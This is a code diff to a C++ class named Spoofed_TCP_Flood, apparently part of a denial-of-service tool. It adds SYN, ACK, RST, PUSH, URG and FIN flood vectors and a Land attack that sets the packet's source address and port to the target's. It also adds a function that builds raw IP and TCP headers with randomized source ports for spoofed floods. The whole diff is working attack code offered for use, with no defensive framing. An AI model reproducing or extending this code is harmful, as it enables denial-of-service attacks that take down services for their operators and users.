@@ -41,14 +41,13 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             }
 
             init_headers(ip, tcp, buf);
-            override_options(tcp);
+            override_headers(tcp, ip);
 
             dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
 
-
-            psh.source_address = inet_addr(conf->website.c_str());
-            psh.dest_address = dst.sin_addr.s_addr;
+            psh.source_address = ip->saddr;
+            psh.dest_address = ip->daddr;
             psh.placeholder = 0;
             psh.protocol = IPPROTO_TCP;
             psh.length = htons(sizeof(struct tcphdr) + strlen(buf));
@@ -83,17 +82,55 @@ Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoof
 
 }
 
-void Spoofed_TCP_Flood::override_options(tcphdr *tcp){
+void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
     switch (conf->vector){
         case config::SpoofedSyn:
-            tcp->syn = 1;
+            tcp->th_flags = TH_SYN;
             break;
         case config::SpoofedAck:
-            tcp->ack = 1;
+            tcp->th_flags = TH_ACK;
+            break;
+        case config::SpoofedRST:
+            tcp->th_flags = TH_RST;
+            break;
+        case config::SpoofedPUSH:
+            tcp->th_flags = TH_PUSH;
+            break;
+        case config::SpoofedURG:
+            tcp->th_flags = TH_URG;
             break;
         case config::SpoofedFin:
-            tcp->fin = 1;
+            tcp->th_flags = TH_FIN;
             break;
+        case config::Land:
+            tcp->th_flags = TH_SYN;
+            ip->saddr = ip->daddr;
+            tcp->source = tcp->dest;
         default:break;
     }
+}
+
+void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
+    auto s_port = Randomizer::randomPort();
+    // IP Struct
+    ip->ihl = 5;
+    ip->version = 4;
+    ip->tos = 16;
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
+    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
+    ip->frag_off = htons(0x0);
+    ip->ttl = 255;
+    ip->protocol = IPPROTO_TCP;
+    ip->check = 0;
+
+    ip->check = csum((unsigned short *) buf, ip->tot_len);
+
+    // TCP Struct
+    tcp->source = htons(static_cast<uint16_t>(s_port));
+    tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+    tcp->seq = 0;
+    tcp->doff = 5;  //tcp header size
+    tcp->window = htons (5840);
+    tcp->check = 0;
+    tcp->th_flags = 0;
 }
